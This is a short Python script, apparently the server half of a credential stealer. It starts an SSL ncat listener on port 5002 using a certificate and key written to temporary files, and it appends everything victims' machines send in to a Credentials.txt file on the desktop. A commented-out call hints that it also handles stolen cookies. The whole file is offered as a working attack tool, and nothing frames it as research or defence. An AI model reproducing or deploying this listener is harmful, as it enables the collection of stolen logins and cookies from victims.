import ast
import pprint
import subprocess
import tempfile
import threading
from pathlib import Path
import colorama
from colorama import Fore
import certs

#
# Autor   ->  an0mal1a
# Name    ->  Pablo
# GitHub  ->  https://github.com/an0mal1a
# Correo  -> pablodiez024@proton.me
#

colorama.init()

# Creamos un archivo con el certificado
cert = tempfile.NamedTemporaryFile(delete=False)
cert.write(certs.get_crte().encode())
cert.close()

key = tempfile.NamedTemporaryFile(delete=False)
key.write(certs.get_locker().encode())
key.close()

ncat = subprocess.Popen(['ncat', '-nvl', '5002', '--ssl-cert', cert.name, '--ssl-key', key.name],
                        stdout=subprocess.PIPE,
                        stdin=subprocess.PIPE)


def write_fileBytes(text, location):
    # Archivo a crear
    with open(location, "ab") as log:
        log.write(text)


def get_user_path():
    return "{}\\".format(Path.home())


location = get_user_path() + "Desktop\\Credentials.txt"

def recv_nc():
    encodings = ["utf-8", "latin-1", "ascii"]  # Lista de codificaciones a probar
    for line in ncat.stdout:
        try:
            for line in ncat.stdout:
                write_fileBytes(line, location)

        except ValueError:
            pass

    write_fileBytes("\n\n[!] CREDENTIALS LOGED SUCSSESFULLY\n".encode(), location)
    #print(Fore.LIGHTYELLOW_EX + "\n[!] CREDENTIALS LOGED SUCSSESFULLY\n" + Fore.RESET)



def main():
    try:
        thread_1 = threading.Thread(target=recv_nc)
        thread_1.start()

    except KeyboardInterrupt:
        exit()


if __name__ == "__main__":
    #processCookies(data)
    main()
